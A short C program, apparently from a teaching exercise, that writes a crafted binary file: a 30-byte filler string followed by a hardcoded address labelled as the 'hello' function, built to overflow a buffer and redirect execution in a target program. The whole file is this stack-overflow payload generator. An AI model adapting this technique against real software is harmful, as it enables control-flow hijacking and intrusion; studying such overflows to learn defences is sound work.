#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
  FILE *fp;

  /* ID, firstname, and lastname */
  char *str = "10 Chiemi ABCDEFGHIJKLMNOPQRST";
  /* address to hello function */
  int address = 0x0001e19;
  if (argc != 2) {
    fprintf(stderr, "Usage: gen_maldata <filename>\n");
    exit(1);
  }

  if ((fp = fopen(argv[1], "wb")) == NULL) {
    fprintf(stderr, "fail to open %s\n", argv[1]);
    exit(1);
  }

  /* input dummy string */
  fwrite(str, 1, 30, fp);
  /* overwrite address */
  fwrite(&address, sizeof(int), 1, fp);
  fclose(fp);
}
